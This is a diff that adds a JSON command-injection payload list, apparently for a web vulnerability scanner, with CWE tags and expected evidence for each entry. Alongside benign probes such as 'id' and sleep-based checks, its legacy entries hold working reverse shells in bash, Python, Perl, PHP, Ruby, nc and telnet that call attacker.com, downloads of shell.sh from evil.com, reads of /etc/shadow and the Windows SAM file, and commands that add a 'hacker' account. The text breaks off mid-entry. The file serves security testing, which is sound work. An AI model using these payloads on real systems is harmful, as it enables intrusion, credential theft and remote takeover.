@@ -1,0 +1,2110 @@
+{
+  "version": "5.1.0",
+  "category": "command_injection",
+  "payloads": [
+    {
+      "id": "cmdi.unix.semicolon_id",
+      "vector": "; id",
+      "description": "Command separator with id.",
+      "context": "separator_unix",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid=",
+        "gid=",
+        "groups="
+      ],
+      "references": [
+        "https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/"
+      ],
+      "tags": [
+        "semicolon"
+      ]
+    },
+    {
+      "id": "cmdi.unix.pipe_id",
+      "vector": "| id",
+      "description": "Pipe into id.",
+      "context": "separator_unix",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "pipe"
+      ]
+    },
+    {
+      "id": "cmdi.unix.and_id",
+      "vector": "&& id",
+      "description": "Conditional-AND chain.",
+      "context": "separator_unix",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "and"
+      ]
+    },
+    {
+      "id": "cmdi.unix.newline_id",
+      "vector": "%0aid",
+      "description": "Newline as a command separator.",
+      "context": "separator_unix",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "newline"
+      ]
+    },
+    {
+      "id": "cmdi.unix.passwd",
+      "vector": "; cat /etc/passwd",
+      "description": "Read /etc/passwd via injected command.",
+      "context": "separator_unix",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "tags": [
+        "passwd"
+      ]
+    },
+    {
+      "id": "cmdi.subst.backtick",
+      "vector": "`id`",
+      "description": "Backtick command substitution.",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "backtick"
+      ]
+    },
+    {
+      "id": "cmdi.subst.dollar_paren",
+      "vector": "$(id)",
+      "description": "$() command substitution.",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "dollar-paren"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.ifs",
+      "vector": ";cat${IFS}/etc/passwd",
+      "description": "${IFS} substitutes for a space where spaces are filtered.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "expected_evidence": [
+        "root:x:0:0:"
+      ],
+      "references": [
+        "https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/"
+      ],
+      "tags": [
+        "ifs",
+        "no-space"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.ifs_braces",
+      "vector": ";cat$IFS$9/etc/passwd",
+      "description": "$IFS$9 whitespace trick.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "ifs",
+        "no-space"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.brace_expansion",
+      "vector": ";{cat,/etc/passwd}",
+      "description": "Brace expansion avoids a literal space.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "brace",
+        "no-space"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.quote_split",
+      "vector": ";c'a't${IFS}/etc/pas'sw'd",
+      "description": "Intra-word quotes defeat command-name blacklists.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "references": [
+        "https://0xmar.medium.com/command-injection-bypass-f730488519cd"
+      ],
+      "tags": [
+        "quote-split"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.input_redirect",
+      "vector": ";cat</etc/passwd",
+      "description": "'<' input redirection avoids a space after cat.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "redirect"
+      ]
+    },
+    {
+      "id": "cmdi.wafbypass.arg0",
+      "vector": ";/bin/b??h -c id",
+      "description": "Glob wildcard on the binary path.",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "waf_bypass": true,
+      "tags": [
+        "glob"
+      ]
+    },
+    {
+      "id": "cmdi.time.unix_sleep",
+      "vector": "; sleep 5",
+      "description": "Unix time-based blind confirmation.",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "time_based": true,
+      "tags": [
+        "sleep"
+      ]
+    },
+    {
+      "id": "cmdi.time.unix_ping",
+      "vector": "| ping -c 5 127.0.0.1",
+      "description": "ping count as a delay primitive where sleep is blocked.",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "time_based": true,
+      "tags": [
+        "ping"
+      ]
+    },
+    {
+      "id": "cmdi.win.type_win_ini",
+      "vector": "& type C:\\Windows\\win.ini",
+      "description": "Windows command chain reading win.ini.",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "expected_evidence": [
+        "[fonts]"
+      ],
+      "tags": [
+        "win.ini"
+      ]
+    },
+    {
+      "id": "cmdi.win.powershell_sleep",
+      "vector": "; Start-Sleep -s 5",
+      "description": "PowerShell time-based blind.",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "time_based": true,
+      "engines": [
+        "powershell"
+      ],
+      "tags": [
+        "powershell",
+        "sleep"
+      ]
+    },
+    {
+      "id": "cmdi.win.ping_delay",
+      "vector": "& ping -n 5 127.0.0.1",
+      "description": "Windows ping delay primitive.",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "time_based": true,
+      "tags": [
+        "ping",
+        "windows"
+      ]
+    },
+    {
+      "id": "cmdi.oob.dns_lookup",
+      "vector": "; nslookup WSSc4n4ry7788.evil-webscanner-test.invalid",
+      "description": "Out-of-band DNS confirmation to a marker host.",
+      "context": "oob",
+      "cwe": "CWE-78",
+      "owasp": "A03:2021",
+      "canary": "evil-webscanner-test.invalid",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "oob": true,
+      "tags": [
+        "oob",
+        "dns"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.00251f0831",
+      "vector": "& cat /etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.003e0549ae",
+      "vector": "| tasklist",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.00b1653ce4",
+      "vector": "| yes > /dev/null &",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.01ded08063",
+      "vector": "| sleep 10",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.0344b2bd5d",
+      "vector": "; history",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.043158546c",
+      "vector": "| ipconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.05c6eb8ae1",
+      "vector": "; cat /proc/version",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.06dcbcec16",
+      "vector": "& netsh firewall show state",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.074bd6bc44",
+      "vector": "& ls && whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.0fd1e4bb2c",
+      "vector": "`sleep 10`",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.12bdf6be43",
+      "vector": "& tar -xzf backup.tar.gz",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.13c9d34037",
+      "vector": "& tasklist",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.15eda05c5f",
+      "vector": "; w",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.16fff74d1b",
+      "vector": "\r ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.19a01d2ddc",
+      "vector": "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.1db02339c4",
+      "vector": "; cat /etc/passwd | grep root",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.1e1b6517aa",
+      "vector": "& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.1e34341974",
+      "vector": "& netstat -an",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.206186dab7",
+      "vector": "| netstat -an",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.258c27dba2",
+      "vector": "& type c:\\windows\\system32\\config\\sam",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.273732dea9",
+      "vector": "& ls -la",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.29207efbab",
+      "vector": "& schtasks /query",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.2d3b67d20b",
+      "vector": "; grep -r \"password\" /var/www",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.2db2707ca2",
+      "vector": "\r id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.2de80eb370",
+      "vector": "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.2f8c6e33e8",
+      "vector": "| cat /etc/crontab",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.32b9ac5b78",
+      "vector": "& wget http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.33822d44ba",
+      "vector": "%0a id",
+      "description": "Imported from the legacy corpus (filter_bypass).",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.33f3a18ebb",
+      "vector": "| cat /etc/shadow",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.344aaeb2a3",
+      "vector": "| route",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.35368d08fc",
+      "vector": "| cat /var/log/apache2/access.log",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.3621869029",
+      "vector": "$(ls)",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.3682ff5030",
+      "vector": "| python -c 'import os; os.system(\"ls\")'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.39dcac444c",
+      "vector": "$(cat /etc/passwd)",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.436a94a872",
+      "vector": "`whoami`",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4400a2e881",
+      "vector": "& python -c 'import os; os.system(\"id\")'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4815eb264c",
+      "vector": "& type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4bae98b29b",
+      "vector": "& pwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4c01509b33",
+      "vector": "| ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4e8dc547bd",
+      "vector": "& php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4e91045bdb",
+      "vector": "& ls & whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.4f61912639",
+      "vector": "& curl http://evil.com/shell.sh",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.51470291d3",
+      "vector": "; dd if=/dev/zero of=/tmp/largefile bs=1M count=1024",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.531ccb0ce9",
+      "vector": "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.5385e0d0ee",
+      "vector": "; tar -czf /tmp/backup.tar.gz /var/www",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.55e800a993",
+      "vector": "| cat /proc/cpuinfo",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.5a21817579",
+      "vector": "| cat /etc/passwd",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.5d6ca36340",
+      "vector": "| perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.5e0bb730c3",
+      "vector": "; ping -c 10 127.0.0.1",
+      "description": "Imported from the legacy corpus (time_delay).",
+      "context": "time_delay",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "command_injection.legacy.5e25cf3e78",
+      "vector": "| telnet attacker.com 4444 | /bin/bash | telnet attacker.com 4445",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.62acb28808",
+      "vector": "%0d id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.62ecaae151",
+      "vector": "| whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.674ae11c75",
+      "vector": "& id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.694ba4ac23",
+      "vector": "; whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.69bdf176b6",
+      "vector": "| ls && id",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.6c8ce0cbf6",
+      "vector": "; ipconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.6ca1771d45",
+      "vector": "& net localgroup administrators",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.71b3e70ffa",
+      "vector": "| printenv",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.74fdd9a373",
+      "vector": "; ifconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.755af43cc8",
+      "vector": "$(pwd)",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.758c82485d",
+      "vector": "| ps aux",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.79dd92dfa8",
+      "vector": "; useradd hacker -p password",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.7a518b275e",
+      "vector": "%0a whoami",
+      "description": "Imported from the legacy corpus (filter_bypass).",
+      "context": "filter_bypass",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.7ab067b741",
+      "vector": "$(whoami)",
+      "description": "Imported from the legacy corpus (substitution).",
+      "context": "substitution",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.7c0ce0f0d4",
+      "vector": "& ipconfig",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.7e944fd545",
+      "vector": "| adduser hacker",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.7eb0e00f0c",
+      "vector": "\n whoami",
+      "description": "Imported from the legacy corpus (separator_windows).",
+      "context": "separator_windows",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.800b92cd99",
+      "vector": "& systeminfo",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.84cfb61390",
+      "vector": "; chmod 777 /var/www/html",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.86795d904c",
+      "vector": "%0d ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.86969a2068",
+      "vector": "| df -h",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.86c5a3f396",
+      "vector": "& ls",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.8768d67879",
+      "vector": "| ls -la",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-78",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "command_injection.legacy.8981f4d4ee",
+      "vector": "& nc -e /bin/sh attacker.com 4444",
+      "description": "Imported from the legacy corpus (generic).",
